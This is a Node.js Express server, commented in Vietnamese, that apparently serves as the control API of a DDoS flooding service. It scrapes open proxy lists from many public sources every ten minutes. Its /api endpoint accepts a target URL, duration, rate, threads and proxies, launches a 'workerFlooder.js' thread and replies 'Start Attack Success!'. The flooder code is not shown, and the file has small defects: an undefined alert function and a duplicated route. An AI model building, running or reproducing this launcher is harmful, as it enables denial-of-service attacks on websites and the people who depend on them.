const express = require('express');
const { Worker } = require('worker_threads');
const fs = require('fs');
const axios = require('axios');
const validator = require('validator');

const api_port = 4000; // Cổng API
const api_key = "quangdev"; // Khóa API của bạn

const app = express();
app.use(express.json());

// Các API proxy
const proxyApis = [
    'https://www.proxyscan.io/download?type=https',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://api.openproxylist.xyz/http.txt',
    'https://api.proxyscrape.com/v2/?request=displayproxies',
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://www.proxydocker.com/en/proxylist/download?email=noshare&country=all&city=all&port=all&type=all&anonymity=all&state=all&need=all',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous',
    'http://worm.rip/http.txt',
    'https://proxyspace.pro/http.txt',
    'https://multiproxy.org/txt_all/proxy.txt',
    'https://proxy-spider.com/api/proxies.example.txt'
];

// Hàm kiểm tra URL nâng cao
const isValidUrl = (url) => validator.isURL(url, { protocols: ['http', 'https'], require_protocol: true });

// Hàm kiểm tra số và giới hạn
const isValidNumber = (value, max = Infinity) => {
    const number = Number(value);
    return !isNaN(number) && number >= 0 && number <= max;
};

// Tạo một worker mới để chạy flooder.js
function runFlooderInThread(url, time, rate, thea, proxy) {
    return new Promise((resolve, reject) => {
        const worker = new Worker('./workerFlooder.js', {
            workerData: { url, time, rate, thea, proxy }
        });

        worker.on('message', (message) => {
            console.log(`[WORKER] ${message}`);
        });

        worker.on('error', (error) => {
            console.error(`[WORKER ERROR] ${error}`);
            reject(error);
        });
    });
}

// Hàm tải proxy từ một URL và lưu vào tệp
async function downloadProxy(proxyUrl, filename = 'proxies.txt') {
    try {
        const response = await axios.get(proxyUrl, { timeout: 10000 }); // Timeout để tránh treo
        fs.appendFileSync(filename, response.data + '\n'); // Thêm proxy vào cuối tệp
        console.log(`Đã tải proxy từ ${proxyUrl} vào tệp ${filename}`);
    } catch (error) {
        console.error(`Lỗi khi tải proxy từ ${proxyUrl}: ${error.message}`);
    }
}

// Hàm tải proxy từ nhiều nguồn
async function downloadProxiesFromApis(proxyApis, filename = 'proxies.txt') {
    for (const api of proxyApis) {
        await downloadProxy(api, filename);
    }
}

// Tự động tải proxy từ các API mỗi 10 phút
setInterval(() => downloadProxiesFromApis(proxyApis), 600000);

// Tải proxy lần đầu khi server khởi động
downloadProxiesFromApis(proxyApis);

// API tải proxy từ tất cả nguồn
app.get('/proxy', async (req, res) => {
    try {
        await downloadProxiesFromApis(proxyApis);
        res.status(200).json({ message: `Đã tải proxy từ các nguồn.` });
    } catch (error) {
        res.status(500).json({ message: `Lỗi khi tải proxy: ${error.message}` });
    }
});

app.get('/api/ping', (req, res) => {
    const { api_key: apiKey } = req.query;
    if (apiKey !== api_key) {
        return res.status(401).json({ status: 500, message: 'API key không hợp lệ' });
    }
    res.status(200).json({ status: 200, message: 'Server vẫn chạy!' });
});

// Ping server mỗi 1 phút
setInterval(() => {
    axios.get(`http://localhost:${api_port}/api/ping?api_key=${api_key}`)
        .then(() => console.log('Ping server OK'))
        .catch(err => {
            console.error('Ping server lỗi:', err.message);
            sendTelegramAlert('Server có thể đã ngừng hoạt động!');
        });
}, 60000);

app.get('/api/ping', (req, res) => {
    const { api_key: apiKey } = req.query;
    if (apiKey !== api_key) {
        return res.status(401).json({ status: 500, message: 'Khóa API không hợp lệ' });
    }
    res.status(200).json({ status: 200, message: 'Server vẫn đang chạy!' });
});


// Route API chính
app.get(`/api`, async (req, res) => {
    const { url, time, rate, thea, proxy, api_key: apiKey } = req.query;

    // Kiểm tra API key
    if (apiKey !== api_key) {
        return res.status(401).json({ status: 500, data: `Khóa API không hợp lệ` });
    }

    // Kiểm tra các tham số
    if (!url || !isValidUrl(url)) {
        return res.status(400).json({ status: 500, data: `URL không hợp lệ` });
    }
    if (!isValidNumber(time, 86400)) {
        return res.status(400).json({ status: 500, data: `Thời gian phải là số trong khoảng 0-86400` });
    }
    if (!isValidNumber(rate)) {
        return res.status(400).json({ status: 500, data: `Rate không hợp lệ` });
    }
    if (!isValidNumber(thea)) {
        return res.status(400).json({ status: 500, data: `Thea không hợp lệ` });
    }
    if (!proxy || proxy.trim() === '') {
        return res.status(400).json({ status: 500, data: `Proxy không được để trống` });
    }

    // Gửi phản hồi trạng thái ban đầu
    res.status(200).json({
        status: 200,
        message: 'Start Attack Success!',
        data: { url, time, rate, thea, proxy }
    });

    // Chạy worker cho từng yêu cầu
    try {
        await runFlooderInThread(url, time, rate, thea, proxy);
    } catch (error) {
        console.error(`[ERROR] Worker failed: ${error}`);
    }
});

app.listen(api_port, () => console.log(`API đang chạy trên cổng ${api_port}`));
